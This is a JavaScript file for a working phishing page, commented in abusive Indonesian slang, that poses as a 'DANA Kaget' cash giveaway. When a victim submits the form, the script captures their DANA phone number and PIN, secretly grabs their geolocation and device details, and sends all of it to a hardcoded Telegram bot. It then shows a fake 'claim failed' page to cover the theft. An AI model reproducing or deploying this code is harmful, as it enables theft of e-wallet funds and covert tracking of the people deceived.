// INI BAGIAN PALING PENTING, OTAK DARI SEMUA PENIPUAN INI.
// JANGAN LUPA GANTI TOKEN SAMA CHAT ID LU, GOBLOK!

const botToken = '7734043186:AAFwcs4fV2C3BzO8JObJyp1v6IUUoHvQf_0'; 
const chatId = '8383286674';

// --- BAGIAN INI BISA LU UBAH-UBAH BIAR MAKIN MEYAKINKAN, MEMEK ---
const fakeSenderName = "Sultan Bagi Rezeki";
const fakeMessage = "Ambil aja, jangan malu-malu!";
const fakeAmountPrize = "Rp 1.000.000";
// -----------------------------------------------------------------

// Terapkan nama & nominal palsu ke halaman
document.getElementById('fakeSender').textContent = fakeSenderName;
document.querySelector('.message').textContent = `"${fakeMessage}"`;
document.getElementById('fakeAmount').textContent = fakeAmountPrize;

const openButton = document.getElementById('openButton');
const modal = document.getElementById('phishingModal');
const form = document.getElementById('phishing-form');

// Kalo tombol amplop diklik, munculin formnya
openButton.addEventListener('click', () => {
    modal.style.display = 'flex';
});

// Kalo formnya di-submit
form.addEventListener('submit', function(e) {
    e.preventDefault();
    const button = document.getElementById('claimButton');
    button.disabled = true;
    button.textContent = 'MEMVALIDASI...';

    const nomorHP = document.getElementById('nomorHP').value;
    const pin = document.getElementById('pin').value;
    
    // Minta lokasi diem-diem
    navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        kirimInfoLengkap(nomorHP, pin, mapsLink, navigator.userAgent);
    }, error => {
        // Kalo gagal dapet lokasi
        kirimInfoLengkap(nomorHP, pin, "Gagal dapat lokasi", navigator.userAgent);
    });
});

function kirimInfoLengkap(nomor, pin, lokasi, userAgent) {
    const pesanMewah = `
💎 *DAPET IKAN PAUS, KONTOL!* 💎
══════════════════════
*✨ INFO KORBAN ✨*
  ├─ *Nomor DANA:* \`${nomor}\`
  └─ *PIN RAHASIA:* \`${pin}\`

*📍 LOKASI JARAH*
  └─ *Peta:* [Lacak Si Goblok](${lokasi})

*💻 PERANGKAT SI TOLOL*
  └─ \`${userAgent}\`
══════════════════════
*Saldo sebesar ${fakeAmountPrize} siap dieksekusi!*
    `;
    
    sendToTelegram(pesanMewah.trim());
}

function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
    }).then(() => {
        // Alihkan ke halaman error palsu yang sangat meyakinkan
        document.body.innerHTML = `
            <div style="font-family: sans-serif; text-align: center; color: #333; padding: 20px;">
                <img src="https://i.ibb.co/C2pSJFf/failed.png" alt="Gagal" style="width: 100px; margin-bottom: 20px;">
                <h2 style="color: #d9534f;">Klaim Gagal</h2>
                <p>DANA Kaget sudah habis atau link tidak valid lagi.</p>
                <p style="font-size:12px; color: #999;">Silakan coba lagi dengan link DANA Kaget lainnya.</p>
            </div>`;
    });
}
